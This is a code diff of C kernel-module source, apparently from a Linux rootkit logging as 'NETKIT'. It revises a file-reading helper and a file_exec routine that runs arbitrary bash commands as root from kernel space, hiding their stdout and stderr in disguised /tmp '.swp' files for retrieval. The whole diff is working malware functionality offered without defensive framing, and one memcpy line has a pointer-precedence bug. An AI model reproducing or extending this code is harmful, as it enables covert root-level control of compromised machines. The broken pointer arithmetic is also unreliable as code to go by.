@@ -13,21 +13,22 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
 {
     struct file *file;
     char *tmp_buf;
-    int retv = 0;
+    int retv;
 
     NETKIT_LOG("[*] reading file '%s'...\n", filename);
     file = filp_open(filename, O_RDONLY | (force_o_largefile() ? O_LARGEFILE : 0), 0);
     if (IS_ERR(file))
     {
         NETKIT_LOG("[!] failed to open file\n");
-        return PTR_ERR(file);
+        retv = PTR_ERR(file);
+        goto LAB_OUT_NO_FILP;
     }
 
     tmp_buf = kzmalloc(4096, GFP_KERNEL);
     if (IS_ERR(tmp_buf))
     {
         retv = PTR_ERR(tmp_buf);
-        goto LAB_OUT_NO_FILP;
+        goto LAB_OUT_NO_TMPBUF;
     }
 
     retv = kernel_read(file, tmp_buf, 4096, NULL);
@@ -41,9 +42,9 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
     *out_buf = kzmalloc(*out_buflen, GFP_KERNEL);
     if (IS_ERR(*out_buf))
     {
+        retv = PTR_ERR(*out_buf);
         *out_buf = NULL;
         *out_buflen = 0;
-        retv = PTR_ERR(*out_buf);
 
         goto LAB_OUT;
     }
@@ -56,6 +57,9 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
         if (retv < 0)
         {
             NETKIT_LOG("[!] failed to read bytes\n");
+            kzfree(*out_buf, *out_buflen);
+            *out_buf = NULL;
+            *out_buflen = 0;
             goto LAB_OUT;
         }
     
@@ -64,6 +68,7 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
         {
             NETKIT_LOG("[!] failed to realloc\n");
             retv = PTR_ERR(*out_buf);
+            kzfree(*out_buf, *out_buflen);
             *out_buf = NULL;
             *out_buflen = 0;
             
@@ -77,9 +82,10 @@ int file_read(const char* filename, u8 **out_buf, size_t *out_buflen)
     NETKIT_LOG("[*] read %lu bytes...\n", *out_buflen);
 
 LAB_OUT:
+    kzfree(tmp_buf, 4096);
+LAB_OUT_NO_TMPBUF:
     filp_close(file, NULL);
 LAB_OUT_NO_FILP:
-    kzfree(tmp_buf, 4096);
 
     if (retv >= 0)
         return 0;
@@ -115,12 +121,17 @@ int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
 {
     #define SHELL_PATH "/bin/bash"
     #define STDOUT_FILE "/tmp/fb0.swp"
-    #define BASH_POSTFIX " 1>" STDOUT_FILE
+    #define STDERR_FILE "/tmp/fb1.swp"
+    #define BASH_POSTFIX " 1>" STDOUT_FILE " 2>" STDERR_FILE
 
     char* envp[] = {"HOME=/", "PWD=/", "TERM=linux", "USER=root", "SHELL=" SHELL_PATH, "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
     char* argv[] = {SHELL_PATH, "-c", NULL, NULL};
     size_t bash_cmd_len;
     int cmd_retv;
+    u8 *stdout_buf = NULL;
+    size_t stdout_buflen = 0;
+    u8 *stderr_buf = NULL;
+    size_t stderr_buflen = 0;
     int retv;
 
     bash_cmd_len = strlen(cmd) + strlen(BASH_POSTFIX) + 1; 
@@ -136,9 +147,48 @@ int file_exec(const char *cmd, u8 **out_buf, size_t *out_buflen)
     
     kzfree(argv[2], bash_cmd_len);
 
-    retv = file_read(STDOUT_FILE, out_buf, out_buflen);
-    if (retv < 0)
-        return retv;
+    file_read(STDOUT_FILE, &stdout_buf, &stdout_buflen);
+    file_read(STDERR_FILE, &stderr_buf, &stderr_buflen);
+
+    if (stdout_buf && stderr_buf)
+    {
+        NETKIT_LOG("stdout (%ld) and stderr (%ld) as out_buf\n", (long)stdout_buf, (long)stderr_buf);
+        *out_buf = kzmalloc(stdout_buflen + stderr_buflen, GFP_KERNEL);
+        if (IS_ERR(*out_buf))
+        {
+            retv = PTR_ERR(*out_buf);
+            *out_buf = NULL;
+            return retv;
+        }
+
+        *out_buflen = stdout_buflen + stderr_buflen;
+
+        memcpy(*out_buf, stdout_buf, stdout_buflen);
+        memcpy(&(*out_buf[stdout_buflen]), stderr_buf, stderr_buflen);
+
+        kzfree(stdout_buf, stdout_buflen);
+        kzfree(stderr_buf, stderr_buflen);
+    } else if (stdout_buf) {
+        NETKIT_LOG("stdout as out_buf\n");
+        *out_buf = stdout_buf;
+        *out_buflen = stdout_buflen;
+    } else if (stderr_buf) {
+        *out_buf = stderr_buf;
+        *out_buflen = stderr_buflen;
+    }
 
     return cmd_retv;
+
+
+    /**out_buf = kzrealloc(*out_buf, *out_buflen, *out_buflen + stdout_buflen);
+    if (IS_ERR(*out_buf))
+    {
+        *out_buf = NULL;
+        *out_buflen = 0;
+        retv = PTR_ERR(*out_buf);
+        goto LAB_OUT;
+    }
+
+    memcpy(&(*out_buf[*out_buflen]), stdout_buf, stdout_buflen);
+    *out_buflen += stdout_buflen;*/
 }
